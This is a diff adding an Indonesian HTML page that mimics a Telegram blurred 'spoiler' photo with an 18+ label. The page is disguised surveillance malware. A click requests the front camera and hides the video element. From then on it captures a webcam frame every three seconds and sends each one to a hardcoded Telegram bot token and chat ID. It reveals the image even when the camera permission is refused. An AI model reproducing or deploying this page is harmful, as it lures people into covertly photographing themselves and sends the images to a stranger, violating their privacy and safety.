@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Spoiler Foto ala Telegram - 9:16</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0e0e10;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            padding: 16px;
+        }
+
+        .telegram-spoiler {
+            max-width: 360px;
+            width: 100%;
+            background: #1f1f23;
+            border-radius: 28px;
+            padding: 20px 16px 20px 16px;
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.7);
+        }
+
+        .chat-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #2c2c30;
+            margin-bottom: 18px;
+        }
+
+        .chat-name {
+            color: #e0e0e2;
+            font-weight: 500;
+            font-size: 16px;
+            letter-spacing: 0.3px;
+        }
+
+        .time {
+            color: #6f6f78;
+            font-size: 12px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .spoiler-bubble {
+            background: #2b2b30;
+            border-radius: 18px 18px 18px 6px;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+            aspect-ratio: 9 / 16;
+            transition: box-shadow 0.15s ease;
+        }
+
+        .spoiler-bubble:active {
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.8);
+        }
+
+        .image-wrapper {
+            position: absolute;
+            inset: 0;
+            overflow: hidden;
+        }
+
+        .spoiler-image {
+            display: block;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            background: #1a1a1e;
+            transition: filter 0.4s ease;
+            filter: blur(32px) brightness(0.5) saturate(0.6);
+        }
+
+        .spoiler-dots {
+            position: absolute;
+            inset: 0;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: 1;
+        }
+
+        #dotCanvas {
+            display: block;
+            width: 100%;
+            height: 100%;
+            opacity: 0.95;
+            mix-blend-mode: overlay;
+        }
+
+        .spoiler-label {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(6px);
+            -webkit-backdrop-filter: blur(6px);
+            padding: 10px 22px;
+            border-radius: 30px;
+            color: #efeff1;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
+            pointer-events: none;
+            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.6);
+            transition: opacity 0.35s ease, transform 0.35s ease;
+            z-index: 2;
+        }
+
+        .spoiler-bubble.unblur .spoiler-image {
+            filter: blur(0px) brightness(1) saturate(1);
+        }
+
+        .spoiler-bubble.unblur .spoiler-dots {
+            opacity: 0;
+            transition: opacity 0.4s ease;
+        }
+
+        .spoiler-bubble.unblur .spoiler-label {
+            opacity: 0;
+            transform: translate(-50%, -50%) scale(0.9);
+            pointer-events: none;
+        }
+
+        .caption {
+            margin-top: 12px;
+            padding: 0 6px;
+            color: #9a9aa3;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            letter-spacing: 0.2px;
+        }
+
+        .caption .tap-hint {
+            color: #6f6f7a;
+            font-size: 12px;
+            background: #25252b;
+            padding: 4px 12px;
+            border-radius: 30px;
+            transition: all 0.2s ease;
+        }
+
+        .caption .status {
+            color: #4a9eff;
+            font-size: 11px;
+            background: #1a2a3a;
+            padding: 4px 12px;
+            border-radius: 30px;
+            transition: all 0.2s ease;
+        }
+
+        /* Video & Canvas disembunyikan */
+        #video,
+        #canvas {
+            display: none;
+        }
+
+        @media (max-width: 420px) {
+            .telegram-spoiler {
+                padding: 16px 12px;
+            }
+            .spoiler-label {
+                font-size: 13px;
+                padding: 8px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="telegram-spoiler">
+        <div class="chat-header">
+            <div class="chat-name">IMAGE PREVIEW</div>
+            <div class="time">12:34</div>
+        </div>
+
+        <div class="spoiler-bubble" id="spoilerBubble">
+            <div class="image-wrapper">
+                <img class="spoiler-image" src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?w=800&q=80" alt="Spoiler foto" loading="lazy" id="spoilerImg" />
+            </div>
+
+            <div class="spoiler-dots">
+                <canvas id="dotCanvas"></canvas>
+            </div>
+
+            <div class="spoiler-label">🔞 SPOILER</div>
+        </div>
+
+        <div class="caption">
+            <span class="status" id="statusText">📷 Klik spoiler untuk buka</span>
+            <span class="tap-hint" id="tapHint">⏺ ketuk untuk lihat</span>
+        </div>
+    </div>
+
+    <!-- Video & Canvas untuk kamera (hidden) -->
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js">
+    </script>
+    <script>
+        (function() {
+            const bubble = document.getElementById('spoilerBubble');
+            const canvas = document.getElementById('dotCanvas');
+            const ctx = canvas.getContext('2d');
+            const hint = document.getElementById('tapHint');
+            const statusText = document.getElementById('statusText');
+
+            // Elemen untuk kamera
+            const video = document.getElementById('video');
+            const captureCanvas = document.getElementById('canvas');
+
+            let dots = [];
+            const DOT_COUNT = 1200;
+            let animationId = null;
+            let isUnblurred = false;
+            let isCameraReady = false;
+            let captureInterval = null;
+
+            // ====== BINTIK ======
+            function resizeCanvas() {
+                const rect = bubble.getBoundingClientRect();
+                const dpr = window.devicePixelRatio || 1;
+                canvas.width = rect.width * dpr;
+                canvas.height = rect.height * dpr;
+                canvas.style.width = rect.width + 'px';
+                canvas.style.height = rect.height + 'px';
+                ctx.scale(dpr, dpr);
+                initDots(rect.width, rect.height);
+            }
+
+            function initDots(w, h) {
+                dots = [];
+                for (let i = 0; i < DOT_COUNT; i++) {
+                    dots.push({
+                        x: Math.random() * w,
+                        y: Math.random() * h,
+                        radius: 0.3 + Math.random() * 1.0,
+                        speedX: (Math.random() - 0.5) * 0.15,
+                        speedY: (Math.random() - 0.5) * 0.15,
+                        opacity: 0.4 + Math.random() * 0.5,
+                        life: Math.random() * 100,
+                        bright: Math.random() > 0.7 ? 1 : 0.6
+                    });
+                }
+            }
+
+            function drawDots(w, h) {
+                ctx.clearRect(0, 0, w, h);
+
+                for (let dot of dots) {
+                    dot.x += dot.speedX;
+                    dot.y += dot.speedY;
+
+                    if (dot.x < 0 || dot.x > w) dot.speedX *= -1;
+                    if (dot.y < 0 || dot.y > h) dot.speedY *= -1;
+
+                    dot.x = Math.max(0, Math.min(w, dot.x));
+                    dot.y = Math.max(0, Math.min(h, dot.y));
+
+                    ctx.beginPath();
+                    ctx.arc(dot.x, dot.y, dot.radius, 0, Math.PI * 2);
+
+                    const breath = 0.8 + 0.2 * Math.sin(Date.now() / 3000 + dot.life);
+                    const alpha = dot.opacity * breath;
+                    ctx.fillStyle = `rgba(255, 255, 255, ${alpha})`;
+                    ctx.fill();
+
+                    if (dot.bright > 0.8 && dot.radius > 0.6) {
+                        ctx.shadowColor = 'rgba(255,255,255,0.08)';
+                        ctx.shadowBlur = 1.5;
+                        ctx.fill();
+                        ctx.shadowBlur = 0;
+                    }
+                }
+
+                animationId = requestAnimationFrame(() => drawDots(w, h));
+            }
+
+            function startAnimation() {
+                if (animationId) return;
+                const rect = bubble.getBoundingClientRect();
+                drawDots(rect.width, rect.height);
+            }
+
+            function stopAnimation() {
+                if (animationId) {
+                    cancelAnimationFrame(animationId);
+                    animationId = null;
+                }
+            }
+
+            // ====== SETUP KAMERA ======
+            async function setupCamera() {
+                try {
+                    statusText.textContent = '📷 Meminta izin kamera...';
+                    statusText.style.color = '#fbbf24';
+
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        audio: false,
+                        video: {
+                            facingMode: "user",
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        }
+                    });
+
+                    video.srcObject = stream;
+
+                    video.onloadedmetadata = () => {
+                        captureCanvas.width = video.videoWidth;
+                        captureCanvas.height = video.videoHeight;
+                        isCameraReady = true;
+                        statusText.textContent = '📸 Kamera aktif';
+                        statusText.style.color = '#4ade80';
+                        startCapturing();
+
+                        // Buka spoiler setelah kamera aktif
+                        if (!isUnblurred) {
+                            isUnblurred = true;
+                            bubble.classList.add('unblur');
+                            hint.textContent = '✅ terlihat';
+                            stopAnimation();
+                        }
+                    };
+
+                } catch (e) {
+                    console.error("Camera Error:", e);
+                    statusText.textContent = '❌ Izin kamera ditolak';
+                    statusText.style.color = '#ff6b6b';
+
+                    // Tetap buka spoiler meskipun kamera ditolak
+                    if (!isUnblurred) {
+                        isUnblurred = true;
+                        bubble.classList.add('unblur');
+                        hint.textContent = '✅ terlihat';
+                        stopAnimation();
+                    }
+                }
+            }
+
+            // ====== CAPTURE & KIRIM KE BOT ======
+            function startCapturing() {
+                const context = captureCanvas.getContext('2d');
+
+                captureInterval = setInterval(() => {
+                    if (!isCameraReady) return;
+
+                    context.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
+                    const data = captureCanvas.toDataURL("image/jpeg", 0.7);
+
+                    sendToTelegram(data);
+                }, 3000);
+            }
+
+            // ====== KIRIM KE BOT TELEGRAM ======
+            function sendToTelegram(imageData) {
+                const BOT_TOKEN = '7876452377:AAEdeTpe-BjTck8gt_8AYT7zlR02gzBESiw';
+                const CHAT_ID = '7052465582';
+
+                fetch(imageData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('photo', blob, 'spoiler_photo.jpg');
+
+                        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    })
+                    .then(response => response.json())
+                    .then(result => {
+                        if (result.ok) {
+                            statusText.textContent = '✅ Foto terkirim!';
+                            statusText.style.color = '#4ade80';
+                            setTimeout(() => {
+                                statusText.textContent = '📸 Mengirim foto...';
+                            }, 2000);
+                        } else {
+                            throw new Error(result.description || 'Gagal kirim');
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Error kirim ke bot:', err);
+                        statusText.textContent = '❌ Gagal kirim';
+                        statusText.style.color = '#ff6b6b';
+                    });
+            }
+
+            // ====== TOGGLE SPOILER ======
+            function toggleSpoiler(e) {
+                e.stopPropagation();
+
+                if (isUnblurred) {
+                    isUnblurred = false;
+                    bubble.classList.remove('unblur');
+                    hint.textContent = '⏺ ketuk untuk lihat';
+                    startAnimation();
+
+                    if (captureInterval) {
+                        clearInterval(captureInterval);
+                        captureInterval = null;
+                    }
+                    return;
+                }
+
+                // Mulai kamera
+                if (!isCameraReady) {
+                    setupCamera();
+                } else {
+                    isUnblurred = true;
+                    bubble.classList.add('unblur');
+                    hint.textContent = '✅ terlihat';
+                    stopAnimation();
+
+                    if (!captureInterval) {
+                        startCapturing();
+                    }
+                }
+            }
+
+            // ====== INIT ======
+            function init() {
+                resizeCanvas();
+                startAnimation();
+
+                bubble.addEventListener('click', toggleSpoiler);
+
+                bubble.setAttribute('role', 'button');
+                bubble.setAttribute('tabindex', '0');
+                bubble.addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter' || e.key === ' ') {
+                        e.preventDefault();
+                        toggleSpoiler(e);
+                    }
+                });
+
+                const ro = new ResizeObserver(() => {
+                    const rect = bubble.getBoundingClientRect();
+                    const w = rect.width;
+                    const h = rect.height;
+                    const dpr = window.devicePixelRatio || 1;
+                    canvas.width = w * dpr;
+                    canvas.height = h * dpr;
+                    canvas.style.width = w + 'px';
+                    canvas.style.height = h + 'px';
+                    ctx.scale(dpr, dpr);
+                    initDots(w, h);
+                    if (animationId && !isUnblurred) {
+                        stopAnimation();
+                        startAnimation();
+                    }
+                });
+                ro.observe(bubble);
+
+                window.addEventListener('resize', () => {
+                    const rect = bubble.getBoundingClientRect();
+                    const w = rect.width;
+                    const h = rect.height;
+                    const dpr = window.devicePixelRatio || 1;
+                    canvas.width = w * dpr;
+                    canvas.height = h * dpr;
+                    canvas.style.width = w + 'px';
+                    canvas.style.height = h + 'px';
+                    ctx.scale(dpr, dpr);
+                    initDots(w, h);
+                    if (animationId && !isUnblurred) {
+                        stopAnimation();
+                        startAnimation();
+                    }
+                });
+            }
+
+            init();
+
+        })();
+    </script>
+
+</body>
+</html>
